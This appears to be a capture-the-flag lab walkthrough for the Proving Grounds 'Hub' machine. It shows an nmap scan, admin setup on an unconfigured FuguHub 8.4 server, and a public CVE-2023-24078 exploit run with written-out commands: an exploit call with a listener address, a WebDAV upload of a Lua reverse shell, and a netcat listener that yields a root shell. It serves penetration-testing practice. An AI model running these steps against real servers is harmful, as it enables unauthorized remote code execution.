# **HUB | PG Practice**

***
## Part 4 of Mid Year CTF machines

## Released on: **Jun 16, 2023**

## Walkthrough: **Yes**
***


Running our nmap scan we have the following open ports


```bash
# Nmap 7.94SVN scan initiated Wed Feb 28 06:33:33 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.227.25
Warning: 192.168.227.25 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.227.25
Host is up (0.14s latency).
Not shown: 65456 closed tcp ports (conn-refused), 75 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: 403 Forbidden
8082/tcp open  http     Barracuda Embedded Web Server
|_http-server-header: BarracudaServer.com (Posix)
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND PATCH POST PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Date: Wed, 28 Feb 2024 05:35:21 GMT
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|_  Server Type: BarracudaServer.com (Posix)
|_http-favicon: Unknown favicon MD5: FDF624762222B41E2767954032B6F1FF
|_http-title: Home
9999/tcp open  ssl/http Barracuda Embedded Web Server
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Date: Wed, 28 Feb 2024 05:35:22 GMT
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|_  Server Type: BarracudaServer.com (Posix)
|_http-server-header: BarracudaServer.com (Posix)
|_http-favicon: Unknown favicon MD5: FDF624762222B41E2767954032B6F1FF
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND PATCH POST PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-title: Home
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Issuer: commonName=Real Time Logic Root CA/organizationName=Real Time Logic LLC/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-07-16T19:15:09
| Not valid after:  2074-04-18T19:15:09
| MD5:   6320:2067:19be:be32:18ce:3a61:e872:cc3f
|_SHA-1: 503c:a62d:8a8c:f8c1:6555:ec50:77d1:73cc:0865:ec62
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 28 06:35:28 2024 -- 1 IP address (1 host up) scanned in 115.13 seconds
```




Navigating to [http://192.168.227.25/](http://192.168.227.25/) we have a **"403 Forbidden"** message from a web server known as nginx


![](https://i.imgur.com/Nkq6YCA.png)

Whereas checking [http://192.168.227.25:8082/](http://192.168.227.25:8082/) we are asked to set an administrator password first (Baaaddd Security!! :{)

![](https://i.imgur.com/XU9QKCX.png)


Successfully set up the administrator account with username: `admin` and password: `admin123`

![](https://i.imgur.com/Cd648Mf.png)


Navigating to the about section of this page i found a version disclosure of this web application called `FuguHub 8.4`



![](https://i.imgur.com/dMd7u9s.png)


searching for an exploit, I found [this](https://github.com/overgrowncarrot1/CVE-2023-24078) Authenticated Remote Code Execution vulnerability 


![](https://i.imgur.com/P3YwsS9.png)


However running this exploit gave us this error, Looks like it is trying to create and admin user but can't because we have already done that, we can go ahead and revert the box then try again


![](https://i.imgur.com/weVhqzj.png)


Running the exploit we get another browser pop-up, make sure to leave it open, according to the instructions the exploit has created a `lua.lsp` file for us locally that contains our reverse shell, let go ahead and do this


```bash
python3 CVE-2023-24078.py -p 4444 -l 192.168.45.209 -r 192.168.227.25 -P 8082
```


![](https://i.imgur.com/M4AiPru.png)


First of all on the new popped-up browser you should see a link make sure to copy the link as this is the location we are uploading our reverse shell to


![](https://i.imgur.com/3VTOOg5.png)


Now run `cadaver` in which folder the `lua.lsp` file was created in and upload the file to the web application

```bash
cd CVE-2023-24078
cadaver http://192.168.227.25:8082/fs/d0ffb9d2dccff24883a23236/
cd ..

# Username: adm1n
# Password: *********

put lua.lsp
```


![](https://i.imgur.com/02H14CG.png)



Start up your listener with netcat then navigate back to the major exploit page and hit the "**Enter**" key on your keyboard and you should have your shell back


```
nc -lvnp 4444
```



![](https://i.imgur.com/gZomFTx.png)



Then we have our reverse shell back as root

![](https://i.imgur.com/9kt0fhQ.png)

GG
